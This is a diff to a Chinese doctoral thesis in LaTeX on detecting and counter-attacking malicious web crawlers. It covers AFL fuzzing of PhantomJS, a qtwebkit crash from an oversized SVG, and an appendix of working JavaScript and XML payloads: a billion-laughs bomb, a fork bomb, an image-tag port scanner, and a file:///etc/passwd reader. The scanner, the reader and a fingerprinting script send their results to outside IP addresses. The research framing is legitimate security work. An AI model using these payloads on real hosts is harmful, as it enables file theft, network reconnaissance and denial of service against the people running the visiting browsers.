@@ -21,6 +21,44 @@
 
 %% Mac系统请使用buaa_mac，并使用XeLaTeX编译。
 \documentclass[doctor,privacy,twoside]{buaa_mac}
+\usepackage{listings}
+\usepackage{xcolor}
+\usepackage{color}
+\definecolor{lightgray}{rgb}{.9,.9,.9}
+\definecolor{darkgray}{rgb}{.4,.4,.4}
+\definecolor{purple}{rgb}{0.65, 0.12, 0.82}
+
+\lstdefinelanguage{JavaScript}{
+  keywords={typeof, new, true, false, catch, function, return, null, catch, switch, var, if, in, while, do, else, case, break},
+  keywordstyle=\color{blue}\bfseries,
+  ndkeywords={class, export, boolean, throw, implements, import, this},
+  ndkeywordstyle=\color{darkgray}\bfseries,
+  identifierstyle=\color{black},
+  sensitive=false,
+  comment=[l]{//},
+  morecomment=[s]{/*}{*/},
+  commentstyle=\color{purple}\ttfamily,
+  stringstyle=\color{red}\ttfamily,
+  morestring=[b]',
+  morestring=[b]"
+}
+
+\lstset{
+   language=JavaScript,
+   backgroundcolor=\color{lightgray},
+   extendedchars=true,
+   basicstyle=\footnotesize\ttfamily,
+   showstringspaces=false,
+   showspaces=false,
+   numbers=left,
+   numberstyle=\footnotesize,
+   numbersep=9pt,
+   tabsize=2,
+   breaklines=true,
+   showtabs=false,
+   captionpos=b
+}
+
 
 % 可加入额外ctexbook文档类的选项，其将会被传递给ctexbook。
 % 例如：\documentclass[doctor,privacy,twoside,fontset=founder]{buaa}
@@ -739,7 +777,14 @@ selenium & window.webdriver \\
 
 \section{恶意爬虫检测}
 
-wait to be done
+我们已经掌握了通过多种粒度的分析方法来识别爬虫的技术，但是，我们需要遏制与对抗的是恶意爬虫，对于普通爬虫的爬取，我们并不需要过多关注。因此，我们还需要从已经识别出的爬虫中进一步地过滤出的恶意爬虫，并将我们的对抗策略用之于它们。我们将一下类型的爬虫视为恶意爬虫：
+\begin{itemize}
+\item 1. 带有攻击载荷的爬虫
+\item 2. 访问频率过快的爬虫
+\item 3. 爬虫触发了过多的错误（400错误，404错误，500错误等）
+\end{itemize}
+
+对使用了恶意攻击载荷的爬虫，我们一律使用视为具有攻击性和威胁性的恶意爬虫。在对访问频率过快的爬虫的定义上，参考的是人工设定的阈值，我们可以根据服务器具体的带宽和一般用户平均的访问频率，用来设定最大访问频率来限制恶意爬虫。除此之外，爬虫的错误触发这一条规则，需要设定允许爬虫触发的最大错误数目，一旦触发的错误返回数目超过给定的阈值，则标记为恶意爬虫。
 
 
 \section{小结}
@@ -833,7 +878,127 @@ wait to be done
 
 PhantomJS的底层使用的是基于qt framework的webkit，我们fuzz的重点也是针对该框架设计的。PhantomJS的整体架构如下图所示：
 
-PhantomJS架构.jpg
+
+\centerline{}
+\begin{figure}[!h]
+  \centering
+  \includegraphics[width=0.68\textwidth]{images/phantomjs_arch.png}
+  \caption{PhantomJS架构}
+  \label{fig:logo}
+\end{figure}
+\centerline{}
+
+
+\subsection{使用的漏洞挖掘策略 （tactics)}
+根据上文中提到的三种技术的性质，并结合我们使用的漏洞挖掘的目标二进制程序的特性，我们制定了相关的漏洞挖掘的策略，通过这些策略，能够让我们尽可能高效地去挖掘目标二进制程序的漏洞，并让我们能够在发现相关crash的时候，尽可能快地定位到触发漏洞的关键函数和关键载荷。我们制定的基本策略如下：
+
+
+\begin{itemize}
+\item 程序分割：因为原本的程序中会包含大量和我们测试无关的代码，且原先的程序的所有代码是开源的。为了保证我们的模糊测试过程中的执行覆盖率以及尽可能降低符号执行过程中出现的路径爆炸问题，我们尽可能地对原先的程序进行一些分割，尽肯能去除掉一些无关的代码，保证最终编译生成程序体积的最小化，保证从输入到关键渲染函数最浅的调用深度。通过这些优化，开增加我们发现漏洞的可能性和效率。
+
+\item 输入筛选：在我们使用的漏洞挖掘工具中，都需要给定一些初始的种子文件和初始化输入，来保证初始化执行的时候执行路径的覆盖率。在此处，我们提供给PhantomJS的输入是需要被渲染的内容，输入的样本的数量和大小都会有相当大的差异。因此，我们需要对收集的渲染样本进行筛选，选择的标准是：（1） 保持样本的覆盖率 （2）尽可能减小样本的大小 （3）保证不同样本的覆盖范围不一样。 此处我们使用的样本由google zero project的domato生成，该工程事先定义了不同渲染的样本的一些必要结构，并利用适当的语法规则生成样本。我们从生成的样本中人工挑选出覆盖率较大的样本作为漏洞挖掘的种子文件。使用afl编译的文件，可以使用其提供的afl-cmin来合并以及最小化corpus。
+
+\item 执行优化：类似于afl的fuzz工具可以在编译过程中使用LLVM mode，通过编译时的优化可以使二进制程序的fuzz速度达到原先的两倍，进而大大增加单位时间内找到crash的可能性。
+\end{itemize}
+
+\subsection{漏洞挖掘效果}
+我们分别使用了三种工具来挖掘PhantomJS中可能存在的漏洞。我们使用driller和AFL在不使用程序分割的情况下直接对原始的程序进行插桩和fuzz，而对于libfuzzer，我们将PhantomJS使用的qtwebkit从程序中单独剥离出来，并使用其基本的render功能对于从标准输入读取的字符串进行渲染，具体实验流程参加附录x（添加到附录的引用）。 我们分别使用三台服务器使用三种不同的工具对PhantomJs进行fuzz，使用的fuzz种子文件包含了pdf，html，js，png，jpg以及svg文件格式。最终我们在使用了AFL的主机上捕获到了以svg文件作为种子文件时产生的大量hangs。
+
+hangs不同于crash，hangs往往是因为产生的攻击载荷导致二进制程序的响应而出现的问题，但通常也可能会导致最终的crash。我们尝试将所有导致的hangs的svg文件，使用原二进制程序手动执行，最终发现hangs文件夹下一个名为 id:000013的输入文件可以导致PhantomJS程序在渲染其内容产生奔溃：
+
+\centerline{}
+\begin{figure}[!h]
+  \centering
+  \includegraphics[width=0.68\textwidth]{images/seg_fault.png}
+  \caption{PhantomJs segment fault}
+  \label{fig:logo}
+\end{figure}
+\centerline{}
+
+我们尝试使用gdb去捕获触发异常的函数，发现漏洞出发点存在于函数 QVector<QPainterPath::Element>::reallocData(int, int, QFlags<QArrayData::AllocationOption>) 上。通过查阅相关文档后发现（添加引用），该函数为qtwebkit中负责为Qvector分配内存空间的函数。而当该函数执行失败后, 返回为空指针，但是在随后的Q\_{}ASSERT访问了该空指针的某个成员变量，从而导致空指针引用的漏洞，最终导致程序崩溃。存在漏洞的代码片段如下所示，具体的漏洞分析过程详情见附录（引用到附录）。
+
+
+\centerline{}
+\begin{figure}[!h]
+  \centering
+  \includegraphics[width=0.68\textwidth]{images/vuln_func.png}
+  \caption{存在漏洞的代码片段}
+  \label{fig:logo}
+\end{figure}
+\centerline{}
+
+
+而导致该漏洞产生的直接原因在于svg是矢量型图片，可以设置缩放比例。而在我们使用的svg中。缩放比例被fuzz成1e9\%，这也意味着该图片会被放大1000万倍。qtwebkit中没有对svg的渲染资源进行限制，最终导致渲染过大的svg图片而申请内存失败，返回并使用了空指针。
+
+此外，我们注意到漏洞存在的函数存在于qtwebkit中，而并不仅仅是PhantomJS。因此，所有使用了qtwebkit的浏览器都有可能受到该漏洞的影响。此外，我们猜想部分浏览器在开发过程中可能没有考虑到svg的这种特性，也有可能触发类似的漏洞，因此，我们在主流的浏览器上测试了我们的攻击载荷，最终我们发现，基于webkit开发的safari浏览器存在类似的问题，虽然无法触发进程crash，但是可以触发OOM （out of memory)，让操作系统奔溃。下图展示了safari在访问包含该svg的网页时的状态，该网页进程一度占用了超过12G的内存（共16G内存）。
+
+\centerline{}
+\begin{figure}[!h]
+  \centering
+  \includegraphics[width=0.68\textwidth]{images/safari_oom.jpg}
+  \caption{safari OOM 漏洞}
+  \label{fig:logo}
+\end{figure}
+\centerline{}
+
+综上，我们可以预见该攻击载荷对于使用了PhantomJs作为webdriver的恶意爬虫的杀伤力，与此同时，该攻击载荷对于使用了safari的普通用户而言，也能产生严重的攻击效果。
+
+
+
+\section{敏感信息窃取型对抗技术}
+
+针对于支持javascript的恶意爬虫，我们可以使用对应的javascript去获取恶意爬虫所在的宿主系统上的敏感信息。利用javascript的api以及特殊的技巧，我们可以获取到包括爬虫所在宿主机内网地址，爬虫所在内网的端口开放情况，甚至是爬虫宿主机上包含敏感信息的文件。
+
+
+\subsection{内网ip地址获取}
+我们可以利用webRTC接口在支持webRTC的浏览器上获取其内网ip地址。webRTC全称为web-based real-time communication。它在浏览器与浏览器或者设备与设备之间直接建立通信的信道，而不需要经由第三方服务器的转发[30]。最初的设计目的是提供直接地点到点的视频和音频传输手段，因此webRTC协议对外提供了一系列的realtime transport protocol的API接口。
+为了构建最高效的连接链路，比如在NAT的内网中，浏览器所在宿主机使用私有IP，在NAT之后需要进行NAT穿透，所以所有的网络接口IP地址都是暴露在这些这些API接口。利用这个特性，可以获得使用网络代理后的爬虫的真实IP地址，从而有效地对抗使用分布式IP的恶意爬虫。
+
+\subsection{端口扫描}
+javascript存在支持跨域的接口，例如cross origin request以及支持跨域的html标签。即使因为浏览器的安全策略我们无法接收到跨域访问的返回结果，也并不妨碍我们发送相关的请求。最终在返回结果中通过超时来判断端口的开放情况。在我们的研究中，我们通过portscan.html（此处引用到附录）中的攻击载荷来获恶意爬虫宿主机的端口开放情况。在
+portscan.html，我们通过构建能够跨域的img标签，并将img标签中的url地址指向我们想要扫描和端口。如果端口不开放，该img标签会超时错误，因此通过settimeout函数捕捉超时，我们可以判断目标的端口开放情况。
+但是因为浏览器自身的安全限制，一部分被标记为unsafe ports的端口是无法在浏览器中访问的，因此针对这部分端口是无法进行端口扫描的。基于常用的端口，并过滤掉unsafe ports，我们在我们的攻击载荷中会扫描如下端口：80,443,445,1521,2222,3306,3389,5901,6379,7001,8000,8001,8005,8080,8888,22222
+
+下图是使用攻击载荷后，在firefox浏览器中扫描内网某ip生成的效果：
+\centerline{}
+\begin{figure}[!h]
+  \centering
+  \includegraphics[width=0.68\textwidth]{images/portscan.png}
+  \caption{firefox 端口扫描}
+  \label{fig:logo}
+\end{figure}
+\centerline{}
+
+将该程序部署到公网环境下，我们捕捉到了微软必应的爬虫请求，发现其在爬虫宿主机上开放了80和445端口：
+\centerline{}
+\begin{figure}[!h]
+  \centering
+  \includegraphics[width=0.68\textwidth]{images/bing_crawler_portscan.png}
+  \caption{bing爬虫端口扫描情况}
+  \label{fig:logo}
+\end{figure}
+\centerline{}
+
+
+\subsection{任意文件读取}
+而在部分配置不当的恶意爬虫中，我们甚至可以读取任意的系统文件。以PhantomJs为例，某些使用了PhantomJs使用了这样的架构：一些静态的爬虫负责拉取网页上的数据并将其存储到本地文件系统，而对于这些网页数据的渲染则是从本地文件中读取数据后再进行的，通过这样异步的处理来提升效率。在这种情境下，渲染相关js的时候，相应的origin对应着本地的文件系统，因此在不违反跨域原则的前提条件下，直接读取本地的文件。具体的攻击载荷在file-read.html (引用附录）。攻击载荷将读取本地的/etc/passwd文件并将其发送到远程，攻击的效果如下图所示：
+
+\centerline{}
+\begin{figure}[!h]
+  \centering
+  \includegraphics[width=0.68\textwidth]{images/file_read.png}
+  \caption{任意文件读取攻击效果}
+  \label{fig:logo}
+\end{figure}
+\centerline{}
+
+\section{小结}
+本章主要介绍了对抗恶意爬虫的三种攻击载荷。资源耗尽型攻击载荷可以针对大部分使用无头浏览器的爬虫，但是因为其攻击原理和攻击载荷都比较简单，容易被恶意爬虫作者发现，并指定相关的绕过策略，无法做为长久使用的攻击载荷。信息窃取类攻击载荷的隐蔽性较强，能够在爬虫渲染页面过程中隐秘地泄露出信息，但攻击载荷的利用条件比较严苛。需要相应的环境的支持，以及特殊的配置。在真实场景下，能够触发的概率不高。对于本章重点介绍的通过漏洞挖掘技术发现的内存破坏型攻击载荷，虽然其漏洞挖掘过程复杂，但是一旦发现、复现相关漏洞，并构造出相应的攻击载荷，将会给恶意爬虫带来降维打击。调试难度高，漏洞函数调用层次深，这些因素都对恶意爬虫作者提出了巨大的挑战，使得内存破坏型漏洞成为恶意爬虫对抗中的”大杀器“。以phantomjs的内存破坏漏洞为例，该漏洞不需要phantomjs去执行javascript，只要存在对页面的渲染，就可以触发该攻击载荷，通过空指针引用直接导致爬虫进程奔溃退出。
+
+
+
+
+
 
 
 % 说明
@@ -850,8 +1015,254 @@ PhantomJS架构.jpg
 % 2005版国标GBT7714-2005
 \Bib{GBT7714-2015}{ref}
 
+\appendix
 % 附录
-\input{tex/chap_appendix}
+
+\section{多策略爬虫工具}
+该程序用于根据不同的爬取策略创建爬虫，这些策略包括以下条目：
+
+\begin{itemize}
+\item[(1)] 搜寻目标（特定类型的信息（例如img），特定页面，网站目录结构，整个网站的所有内容， 有弱点的网页程序 ，目录暴力破解）
+\item[(2)] 爬行速度（慢，中，快，非常快，随机）
+\item[(3)] 爬行迭代算法（BFS，DFS）
+\item[(4)] 不同的网络驱动程序（python，curl，firefox，chrome，PhantomJs）
+\item[(5)] 对抗策略（ip混淆，http header突变）
+\end {itemize}
+
+我们程序中的每个爬虫，它们都能够在一个时隙中发送一系列请求。 对于该时隙中的每个爬虫，我们都可以提供以下参数对其进行初始化。
+
+\begin{itemize}
+\item[(1)] 网站的IP和端口
+\item[(2)] 上述策略的选择和组合
+\item[(3)] 限制长度（限制请求session的长度）
+\end {itemize}
+
+发送的数据经过解析后的呈现的json数据结构如下所示：
+\lstset{language=JavaScript}
+\begin{lstlisting}
+{"request_time": 1561956984.3283665, "src_ip": "172.16.10.1", "dst_ip": "172.16.10.1", "path": "/plus/qrcode.php?action=get_qrcode&type=index&id=0", "content": "", "cookie": {}, "headers": {"Host": "172.16.10.1", "Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/70.0.3509.0 Safari/537.36", "Accept": "image/webp,image/apng,image/*,*/*;q=0.8", "Referer": "http://172.16.10.1:8001/plus/qrcode.php?id=0&type=index", "Accept-Encoding": "gzip, deflate"}, "response_code": 200, "response_len": 420}
+\end{lstlisting}
+
+返回结果的json格式如下所示：
+\lstset{language=JavaScript}
+\begin{lstlisting}
+{"response_code": 200, "response_len": 6, "content":"aaaaaaa"}
+\end{lstlisting}
+
+此外，为了模拟分布式爬虫，我们在所有的请求的url中添加一个ip字段，该ip字段将会被作为爬虫请求的来源ip进行相应的处理。
+
+
+
+
+
+
+
+\section{动态特征获取}
+
+通过在目标浏览器中执行相关javascript代码，从而获取目标浏览器中的动态特征。这些特征包括：webrtc特征，窗口特征，电池状态，html5的相关api接口，浏览器插件以及鼠标行为。部分函数之间有严格的顺序依赖关系，此外，还需要保证javascript在不同浏览器中的兼容性。
+
+\lstset{language=JavaScript}
+\begin{lstlisting}
+var webrtc_res = 'internal ip: ';
+var fp = '';
+var window_info = "window size: " + window.outerWidth + 'x' +  window.outerHeight;
+var close_time = '';
+var special_func = 'special functions: ';
+var battery_s = 'battery status: ';
+var webaudio_s = 'webaudio status: '
+var websocket_s = 'websocket status: ';
+var webgl_s = 'webGL status: ';
+var webrtc_s = 'webrtc status: ';
+var plugins_s = 'plugins: ';
+var all_events = {'onmouseover':0,'onmouseout':0, 'onmousedown':0, 'onmouseup':0, 'onmouseleave':0, 'onmouseenter':0, 'ondblclick':0, 'oncontextmenu':0, 'onclick':0, 'onkeydown':0, 'onkeypress':0, 'onkeyup':0 };
+var event_res = 'mouse and keyboard events: ';
+var newline = String.fromCharCode(10);
+
+...
+此处省略具体函数实现代码
+...
+
+hook_mouse_keyboard_event();
+webrtc();
+battery_status();
+websocket_status();
+webaudio_status();
+webgl_status();
+webrtc_status();
+plugin_list();
+special_function();
+alert_detection();
+
+function final(){
+    return webrtc_res + newline + fp  + newline + window_info + newline + close_time + newline + battery_s +newline + webaudio_s + newline + websocket_s + newline + webgl_s + newline + webrtc_s + newline + plugins_s + newline + special_func + newline + event_res + JSON.stringify(all_events) + newline;
+}
+setTimeout(function() {var f = final();console.log(f);window.location.href='http://4.1.5.4/1.php?a=' + btoa(f);}, 1000);
+\end{lstlisting}
+
+
+
+\section{示例攻击载荷}
+
+\subsection{资源耗尽型攻击代码}
+资源耗尽型攻击代码通过大量的死循环以及递归，来实现对爬虫宿主机计算和存储资源的大量消耗，从而实现干扰爬虫正常运行的目标。
+
+如下所示是billion laugh的攻击载荷，通过大量的参数实体中的引用，使得最后输出的xml的内容中包含指数级数量的lol字符串。
+\lstset{language=JavaScript}
+\begin{lstlisting}
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+ <!ENTITY lol "lol">
+ <!ELEMENT lolz (#PCDATA)>
+ <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+ <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+ <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+ <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+ <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+ <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+ <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+ <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+ <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz>
+\end{lstlisting}
+
+如下所示js fork bomb的攻击载荷，该攻击载荷通过指数级的fork来实现对爬虫宿主系统的计算资源的耗尽，直至其无法再fork新的进程为止：
+\lstset{language=JavaScript}
+\begin{lstlisting}
+function die () {
+  setTimeout(function () {die(); die()}, 0)
+}
+die();
+\end{lstlisting}
+
+
+\subsection{示例端口扫描程序}
+
+该攻击载荷用于在爬虫所在的无头浏览器中运行，获取爬虫所在宿主机内网中的端口开放情况。因为unsafe ports的浏览器安全机制的限制，部分关键端口无法扫描。扫描完成后，会将扫描结果通过窗口跳转机制传输到指定的服务器上。
+
+\lstset{language=JavaScript}
+\begin{lstlisting}
+var result="";
+var newline = String.fromCharCode(10);
+function scanPort(target,port,timeout)
+{
+  var time = Date.now();
+	var img=new Image();
+	img.onerror=function ()
+	{
+	   console.log( target + ':' + port + '  ' + (Date.now() - time) + 'ms');
+		if (!img) return;
+		img=undefined;
+		out(target,port,"open");
+	}
+
+	img.onload=img.onerror;
+	img.src='http://'+target+':'+port;
+
+	setTimeout(function() {
+		if (!img) return;
+        img = undefined;
+		out(target,port,"close");
+		},timeout);
+}
+
+function scanTarget(target,port,timeout)
+{
+	for(i=0;i<port.length;i++)
+		scanPort(target,port[i],timeout);
+}
+
+var out=function(target,port,status) {
+	result+=target+':'+port+'  '+status+newline;
+	console.log(target+':'+port+'  '+status+newline);
+}
+
+var scan=function(target,port,timeout)
+{
+	scanTarget(target, port.split(','), timeout);
+}
+
+scan("192.168.244.154","80,443,445,1521,2222,3306,3389,5901,6379,\
+7001,8000,8001,8005,8080,8888,22222",1000);
+setTimeout(function() {window.location.href="http://8.90.144.214/1.php?b="+result;},2000);
+
+\end{lstlisting}
+
+\subsection{任意文件读取攻击载荷}
+
+该攻击载荷一旦成功执行，可以在爬虫所在的宿主机读取任意文件并发送到远程服务器。但是因为该攻击载荷使用了cross origin request的技巧，因此要求爬虫在本地文件系统上渲染该文件，且无头浏览器安全策略不限制file协议的使用。
+
+\lstset{language=JavaScript}
+\begin{lstlisting}
+var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+    if (xhr.readyState == XMLHttpRequest.DONE) {
+	    window.location.href="http://7.9.5.4/index.php?msg=" + xhr.responseText;
+    }
+}
+xhr.open('GET', 'file:///etc/passwd', true);
+xhr.send(null);
+\end{lstlisting}
+
+
+
+\section{漏洞挖掘与分析}
+
+\subsection{漏洞挖掘AFL示例}
+首先使用AFL提供的afl-gcc以及afl-g++来编译PhantomJs，二次编译的目的是为了在程序中插桩，通过插桩来获取程序执行时的执行路径，以此来计算fuzz的覆盖率指标。
+
+\lstset{language=JavaScript}
+\begin{lstlisting}
+CC=/usr/local/bin/afl-gcc CXX=/usr/local/bin/afl-g++  CXXFLAGS="-Winvalid-pch" python build.py
+\end{lstlisting}
+
+为了使得phantomjs能够加载和渲染相应的网页，我们需要编写额外的javascript的程序进行引导。该程序只需要实现访问网页并渲染的最基本功能即可：
+
+\lstset{language=JavaScript}
+\begin{lstlisting}
+"use strict";
+var page = require('webpage').create(),address, output,system = require('system'),
+
+output = "/var/www/html/out.png";
+
+page.content = '<html><h1>hello world!</h1></html>';
+page.content = system.stdin.readLine();
+window.setTimeout(function () {
+            page.render(output);
+            phantom.exit();
+        }, 200);
+\end{lstlisting}
+
+此外，我们选取了了一个使用domato生成的svg文件做为原始输入进行fuzz，svg文件的内容如下：
+\lstset{language=JavaScript}
+\begin{lstlisting}
+<?xml version='1.0' ?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="54" height="179\%"><desc>c</desc><style type="text/css"> {c: ;}</style><defs><marker id="a" stroke="url(#h)"><line  stroke-dasharray="0.1" x1="-24\%" y1="100\%" x2="-0.1" y2="1" /></marker></defs></svg>
+\end{lstlisting}
+
+为了充分利用高性能服务器的计算能力，我们使用一个master进程，三个slave进程的方式进行并发fuzz：
+
+\lstset{language=JavaScript}
+\begin{lstlisting}
+afl-fuzz -i input/ -o output/ -m none -M fuzzer01   -- phantomjs_afl /root/fuzz/test/test3.js
+afl-fuzz -i input/ -o output/ -m none -S fuzzer02   -- phantomjs_afl /root/fuzz/test/test3.js
+afl-fuzz -i input/ -o output/ -m none -S fuzzer03   -- phantomjs_afl /root/fuzz/test/test3.js
+afl-fuzz -i input/ -o output/ -m none -S fuzzer04   -- phantomjs_afl /root/fuzz/test/test3.js
+\end{lstlisting}
+
+通过几天的fuzz，我们获取到了大量的hangs（超时错误）:
+
+\centerline{}
+\begin{figure}[!h]
+  \centering
+  \includegraphics[width=0.68\textwidth]{images/afl_hangs.png}
+  \caption{AFL hangs}
+  \label{fig:logo}
+\end{figure}
+\centerline{}
+
+
+
+
 
 % 攻读学位期间成果
 \input{tex/chap_achievement}
